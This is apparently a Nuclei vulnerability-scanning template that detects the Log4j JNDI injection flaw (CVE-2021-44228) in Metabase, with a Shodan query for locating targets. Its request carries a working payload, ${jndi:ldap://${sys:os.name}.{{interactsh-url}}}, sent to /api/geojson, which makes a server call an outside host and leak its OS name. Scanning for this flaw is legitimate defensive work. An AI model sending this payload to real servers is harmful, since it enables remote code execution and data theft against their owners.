id: metabase-log4j
info:
  author: DhiyaneshDK
  description: The vulnerability exists due to incomplete patch in Apache Log4j 2.15.0
    for a code injection vulnerability VU58816 (CVE-2021-44228) in certain non-default
    configurations. A remote attacker with control over Thread Context Map (MDC) input
    data when the logging configuration uses a non-default Pattern Layout with either
    a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern
    (%X, %mdc, or %MDC) can pass malicious data using a JNDI Lookup pattern and perform
    a denial of service (DoS) attack, exfiltrate data or execute arbitrary code.
  metadata:
    shodan-query: title:"Metabase"
    verified: true
  name: Metabase - Remote Code Execution (Apache Log4j)
  reference:
  - https://www.cybersecurity-help.cz/vdb/SB2021121706
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,metabase
requests:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}'
